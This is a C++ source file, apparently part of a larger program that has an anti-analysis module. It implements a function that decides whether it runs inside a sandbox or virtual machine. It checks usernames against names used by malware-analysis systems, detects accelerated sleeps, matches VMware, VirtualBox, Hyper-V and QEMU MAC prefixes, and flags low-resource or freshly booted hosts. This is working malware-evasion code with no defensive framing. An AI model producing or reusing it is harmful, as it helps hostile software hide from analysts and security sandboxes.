#include "Sandbox.h"
#include "AntiAnalysis.h"
#include "Strings.h"

#include <windows.h>
#include <iphlpapi.h>

#include <cstring>
#include <string>

#pragma comment(lib, "iphlpapi.lib")

namespace sandbox {

namespace {

bool blacklisted_user() {
    char buf[256] = {};
    DWORD n = sizeof(buf);
    if (!GetUserNameA(buf, &n)) return false;
    // case-insensitive contains check against known sandbox usernames
    auto lower = [](std::string s) {
        for (auto& c : s) if (c >= 'A' && c <= 'Z') c += 32;
        return s;
    };
    std::string u = lower(buf);
    static const char* kBad[] = { "sandbox", "malware", "virus", "cuckoo",
                                  "sample", "john doe" };
    for (auto b : kBad) {
        if (u.find(b) != std::string::npos) return true;
    }
    return false;
}

bool sleep_acceleration() {
    ULONGLONG t0 = GetTickCount64();
    Sleep(1000);
    ULONGLONG t1 = GetTickCount64();
    // Real host: ~1000ms. Hooked/accelerated sandbox: noticeably less.
    return (t1 - t0) < 980;
}

bool vm_mac() {
    // Known VM/hypervisor MAC OUI prefixes.
    static const unsigned char ouis[][3] = {
        {0x00,0x05,0x69}, // VMware
        {0x00,0x0C,0x29}, // VMware
        {0x00,0x50,0x56}, // VMware
        {0x00,0x1C,0x42}, // Parallels
        {0x08,0x00,0x27}, // VirtualBox
        {0x00,0x15,0x5D}, // Hyper-V
        {0x52,0x54,0x00}, // QEMU/KVM
    };
    ULONG bufLen = 0;
    if (GetAdaptersInfo(nullptr, &bufLen) != ERROR_BUFFER_OVERFLOW) return false;
    std::string mem(bufLen, '\0');
    auto* info = reinterpret_cast<IP_ADAPTER_INFO*>(mem.data());
    if (GetAdaptersInfo(info, &bufLen) != NO_ERROR) return false;
    for (auto* a = info; a; a = a->Next) {
        if (a->AddressLength < 3) continue;
        for (auto& oui : ouis) {
            if (a->Address[0] == oui[0] && a->Address[1] == oui[1] && a->Address[2] == oui[2]) {
                return true;
            }
        }
    }
    return false;
}

bool weak_host() {
    SYSTEM_INFO si{};
    GetNativeSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;

    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    if (!GlobalMemoryStatusEx(&ms)) return false;
    if (ms.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return true; // < 2GB

    if (GetTickCount64() < (20ULL * 60 * 1000)) return true; // uptime < 20m
    return false;
}

} // namespace

bool is_sandbox() {
    if (aa::detected()) return true;
    if (blacklisted_user()) return true;
    if (sleep_acceleration()) return true;
    if (vm_mac() && weak_host()) return true;
    return false;
}

} // namespace sandbox
